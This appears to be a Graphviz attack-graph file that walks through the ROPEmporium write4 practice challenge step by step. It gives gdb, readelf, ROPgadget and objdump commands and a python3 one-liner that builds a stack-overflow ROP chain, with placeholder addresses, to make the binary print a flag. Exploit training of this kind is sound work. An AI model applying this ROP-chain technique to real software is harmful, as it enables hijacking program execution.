digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - ROPEmporium write4"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Overflow offset identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Writable memory identified"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Write gadget identified"];
  node3 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="print_file located"];
  node4 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="ROP payload crafted"];
  node5 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Flag printed"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="gdb -q ./write4"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="readelf -S write4"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="ROPgadget --binary write4 | grep \"mov .*\\[.*\\].*\""];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -d write4 | grep print_file"];
  node3 -> node4 [color="#555555", fontname="Helvetica", fontsize="10", label="python3 -c \"from struct import pack; import sys; pad=b'A'*40; pop_r14_r15=0xPOP_R14_R15_RET; mov_r14_r15=0xMOV_QWORD_PTR_R14_R15_RET; pop_rdi=0xPOP_RDI_RET; data=0xDATA_ADDR; print_file=0xPRINT_FILE; chain=pad + pack('<Q', pop_r14_r15)+pack('<Q', data)+b'flag.txt' + pack('<Q', mov_r14_r15) + pack('<Q', pop_rdi)+pack('<Q', data)+pack('<Q', print_file); sys.stdout.buffer.write(chain)\" > payload.bin"];
  node4 -> node5 [color="#555555", fontname="Helvetica", fontsize="10", label="./write4 < payload.bin"];
}
